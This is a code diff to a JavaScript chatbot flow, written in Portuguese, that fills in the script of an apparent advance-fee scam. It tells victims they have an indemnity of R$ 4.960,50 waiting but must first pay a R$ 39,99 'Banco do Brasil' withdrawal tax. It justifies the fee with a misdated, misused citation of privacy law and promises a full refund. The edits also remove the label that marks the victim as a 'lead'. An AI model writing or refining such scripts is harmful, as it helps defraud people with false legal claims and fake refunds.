@@ -495,30 +495,21 @@ const flow = {
       lines: [
         "Valor disponível para saque: R$ 4.960,50",
         "Chave Pix: ",
-        "Imposto de Saque IOF BANCO do Brasil: R$ 39,99"
+        "Imposto de Saque BANCO do Brasil: R$ 39,99"
       ]
     },
-    choices: [{ label: "Resposta lead: Porque tenho que pagar este imposto ?", next: "bloco14" }]
+    choices: [{ label: "Porque tenho que pagar este imposto ?", next: "bloco14" }]
   },
   bloco14: {
     messages: [
-      "XXXX XXX XXX XXX XXX XXXXX XXXXX?",
-      "XXXXXXX XXXXXXXXXX XX XXXXXXX:",
-      "XXX X XXXXXXXXXX XXXXX XXXX XXX XXXXXXX XXXXXXX XXXXX XXXXXXXX.",
-      "XXXX XXXXXXXX XXXXXXX, XXXXXXXX XX XXXXX XXX XXXXXXXX X XXXXXXXX XXXXXXXX."
+      "⚠️ Seu dinheiro está vinculado ao seu CPF e somente você pode acessá-lo. Portanto, a taxa transacional paga ao solicitar o saque, não pode ser descontada do valor total que você tem a receber, devido à Lei que protege os direitos fundamentais de Privacidade e Segurança.",
+      "Mas não precisa se preocupar, o valor da taxa é 100% reembolsada após a confirmação do sistema, junto do valor indenizatorio.",
+      "Lei n.° 13.709 de 14 de agosto de 2016",
     ],
-    choices: [{ label: "XXXXXXXX XXXXXXXX", next: "bloco15" }],
+    choices: [{ label: "Concluir pagamento e receber minha indenização", next: "bloco15" }],
     pauseAfter: 3000
   },
-  bloco15: {
-    messages: [
-      "XXX XXXXXXXXXXX XXX XXXXXXXX!",
-      "XXXXXXX XX XXXX: XXXXXXXX XXXXXXXX"
-    ],
-    choices: [{ label: "XXXXXXXX", next: "bloco1" }],
-    pauseAfter: 2000
-  }
-};
+  
 
 
 let stepToken = 0;
